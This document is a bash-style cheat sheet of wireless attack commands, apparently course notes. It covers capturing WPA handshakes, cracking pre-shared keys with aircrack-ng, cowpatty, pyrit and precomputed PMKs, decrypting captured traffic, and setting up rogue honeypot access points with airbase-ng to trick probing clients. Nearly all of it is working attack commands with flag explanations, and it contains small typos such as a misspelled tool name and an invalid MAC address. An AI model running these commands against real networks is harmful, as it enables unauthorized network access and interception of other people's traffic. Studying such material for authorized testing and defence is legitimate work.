#!/bin/bash

# wpa psk cracking

# start the monitor mode interface
airmon-ng start wlan0

# scan for networks
airodump-ng mon0 --channel 1 --write dlink-psk


# get the 4 way handshake - deauthenticate client


# crack the psk key
aircrack-ng dlink-psk-01.cap -w dict

# on the options screen select the network essid by number
1


#-----------------------------------------------#

cowpatty -f dict dlink-psk-01.cap -s dlink

# -f dict = dictionary file
# dlink-psk-01.cap = packet capture
# -s dlink = network essid

#-----------------------------------------------#
#	decryption packets
#-----------------------------------------------#


# wpa decrypting with airedecap-ng

airedecap-ng -e "wireless labs" -b 00:21:91:D2:8E:25  -p securitytube dlink-psk-01.cap

# -e "wireless labs" = network essid
# -b 00:21:91:D2:8E:25 = netwrok bssid
# -p securitytube = wpa password
# dlink-psk-01.cap = packet capture file


# this will create a file with a suffix of dec ( dec = decrypted )

# open the decrypted packet with wireshark

wireshark dlink-psk-01-dec.cap &


#-----------------------------------------------#

# speeding up wpa psk cracking

#-----------------------------------------------#
#	pre calcualte pmk with genpmk
#-----------------------------------------------#

genpmk -f /pentest/passwords/wordlists/darkc0de.lst -d PMK-victim -s "BTHub3-RZ8C"

# -f /pentest/passwords/wordlists/darkc0de.lst = wordlist
# -d PMK-victim = save to file
# -s "BTHub3-RZ8C" = essid of AP


#-----------------------------------------------#

# use cowpatty with the PMK to crack 
cowpatty -d PMK-victim -s "BTHub3-RZ8C" -r victim-01.cap

# -d PMK-victim = PMK file
# -s "BTHub3-RZ8C" = essid of AP
# -r victim-01.cap = packet capture file

#-----------------------------------------------#
#	Pyrit
#-----------------------------------------------#

# analyze the packet capture file
pyrit -r victim-01.cap analyze


pyrit -r victim-01.cap -i PMK-victim attack_cowpatty

# -r victim-01.cap = packet capture file
# -i PMK-victim = pmk
# attack_cowpatty = use pmk

#-----------------------------------------------#
#	airolib-ng
#-----------------------------------------------#

# use the pre calcualted PMK with aircrack

airolib-ng PMK-Aircrack --import cowpatty PMK-victim

# PMK-Aircrack = aircrack-ng compatible databse to create
# --import cowpatty PMK-victim = calcualted we created


#-----------------------------------------------#
#	Honeypot for multiple encryption types
#-----------------------------------------------#

# create netwrk interface in monitor mode
airmon-ng start wlan0 # mon0

# use airodump to find the client
airodump-ng mon0

# look for probe request from unassociated client
# we dont know what encryption the network the client is searching for

# create multiple monitor mode interfaces
airmon-ng start wlan0 # mon1

airmon-ng start wlan0 # mon2

airmon-ng start wlan0 # mon3

airmon-ng start wlan0 # mon4


# show all the monitor mode interfaces
airmon-ng


# create 4 honeypots with airbase-ng for open, wep, wpa, wpa2

# open authentication
airbase-ng --essid networkname -a aa:aa:aa:aa:aa:aa -c 1 mon1

# --essid networkname = netork essid
# -a aa:aa:aa:aa:aa:aa = fake bssid
# -c 1 = channel 1 need to keep everything on one channel
# mon1 = first monitor mode interface

# wep authentication
airbase-ng --essid networkname -a bb:bb:bb:bb:bb:bb -c 1 -W 1 mon2

# --essid networkname = netork essid
# -a bb:bb:bb:bb:bb:bb = fake bssid
# -c 1 = channel 1 need to keep everything on one channel
# -W 1 = set the wep flag, so it broadcasts a wep network
# mon2 = second monitor mode interface

# wpa authentication
airbase-ng --essid networkname -a cc:cc:cc:cc:cc:cc -c 1 -W 1 -z 2 mon3

# --essid networkname = netork essid
# -a cc:cc:cc:cc:cc:cc = fake bssid
# -c 1 = channel 1 need to keep everything on one channel
# -W 1 = set the wep flag, so it broadcasts a wep network
# -z 2 = wpa tkip encryption
# mon3 = third monitor mode interface


# wpa2 authentication
airbase-ng --essid networkname -a dd:dd:dd:dd:dd:dd -c 1 -W 1 -Z 4 mon4

# --essid networkname = netork essid
# -a dd:dd:dd:dd:dd:dd = fake bssid
# -c 1 = channel 1 need to keep everything on one channel
# -W 1 = set the wep flag, so it broadcasts a wep network
# -Z 4 = wpa2 ccmp encryption
# mon4 = fourth monitor mode interface


# we now have 4 fake acess points with different encryption

# get cleints mac address thats probing for networks
# open wireshark and sniff on mon0

# start wireshark and add a wireshark filter for the clients mac address
wlan.addr == 60:FB:42:DS:E4:01

# airodump-ng write packets to file
airodump-ng --channel 1 --write honeypot mon0 


# client will send out probe request for the access point

# you should get the wpa handshake in airodump and the bssid it connect to

# open the packet capture with wireshark
wireshark honeypot-01.cap &

# add a wireshark filter for the eapol frames
eapol


# brute force the handshake with aircrack-ng
aircrack-ng -w dict honeypot-01.cap

# -w dict = dictionary file
# honeypot-01.cap
# honeypot-01.cap = packet capture

# on the next screen it shows you the access point and which one it has a handshake for
# enter the number next to the network that has the handshake


#-----------------------------------------------#
#	cracking wpa2 with just the client
#-----------------------------------------------#

# start sniffing
airodump-ng --channel 1 mon0

# find client thats probing for access point ( not associated )

# set up 4 access points see (Honeypot for multiple encryption types)
# copy the clients mac address

# save packets
airodump-ng --channel 1 --write wpacrack mon0

# crack wpa handshake
aircrack-ng -w /pentest/passwords/wordlists/darkc0de.lst wpacrack-0.cap



